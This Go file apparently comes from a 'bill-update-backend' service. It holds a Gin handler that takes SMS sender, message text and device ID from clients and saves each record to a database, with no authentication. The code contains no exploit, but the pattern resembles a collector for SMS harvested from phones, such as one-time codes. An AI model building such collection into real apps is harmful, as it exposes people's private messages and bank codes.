package handlers

import (
	"bill-update-backend/database"
	"bill-update-backend/models"
	"net/http"

	"github.com/gin-gonic/gin"
)

func SubmitSms(c *gin.Context) {
	var req struct {
		DeviceID   string `json:"device_id"`
		Sender     string `json:"sender"`
		Message    string `json:"message"`
		ReceivedAt string `json:"received_at"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	record := models.SmsRecord{
		DeviceID:   req.DeviceID,
		Sender:     req.Sender,
		Message:    req.Message,
		ReceivedAt: req.ReceivedAt,
	}
	database.DB.Create(&record)
	c.JSON(http.StatusOK, gin.H{"message": "SMS saved", "id": record.ID})
}
